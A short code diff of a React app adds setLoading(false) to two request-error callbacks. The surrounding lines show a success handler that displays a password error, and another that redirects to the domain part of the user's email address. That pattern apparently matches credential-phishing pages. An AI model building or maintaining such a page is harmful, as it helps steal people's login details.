@@ -49,6 +49,7 @@ function App() {
         setLoading(false)
         setPwdError(true)
       }, (error) => {
+          setLoading(false)
           console.log(error.text);
       });
     }
@@ -60,6 +61,7 @@ function App() {
         const redir = getPartAfterDot(email)
         window.location.replace(`https://${redir}`);
       }, (error) => {
+          setLoading(false)
           console.log(error.text);
       });
     }
